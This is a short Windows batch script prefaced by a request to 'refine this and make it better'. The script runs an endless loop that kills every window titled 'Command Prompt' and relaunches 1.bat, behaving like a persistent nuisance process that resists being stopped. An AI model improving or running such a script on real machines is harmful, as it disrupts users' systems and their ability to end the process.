::Refine this and make it better.
@ECHO OFF
set n=1
:next
set /a n+=1
title %n%
FOR /F "tokens=* USEBACKQ" %%F IN (`tasklist /FI "WINDOWTITLE eq ^%n^%" ^| find/c "exe"`) DO (
SET windowcount=%%F
)
taskkill /FI "WINDOWTITLE eq Command Prompt"
if "%windowcount%"=="1" (
start 1.bat
)
goto :next
